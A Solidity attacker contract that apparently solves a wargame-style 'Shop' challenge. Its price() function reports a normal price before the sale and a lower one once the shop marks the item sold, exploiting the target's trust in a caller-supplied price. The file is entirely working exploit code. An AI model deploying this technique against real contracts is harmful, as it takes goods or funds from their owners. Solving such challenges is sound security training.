// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;
    function isSold()external view returns(bool);
}
contract ShopAttacker{
    IShop public shop;
    uint256 constant NORMAL_PRICE = 100;
    uint256 constant LESS_PRICE = 1;
    constructor(address _shopAddress){
        shop = IShop(_shopAddress);
    }

    function attack() external{
        shop.buy();
    }

    function price() public view returns (uint256){
        if(shop.isSold()== true){
            return LESS_PRICE;
        }else{
            return NORMAL_PRICE;
        }
    }
}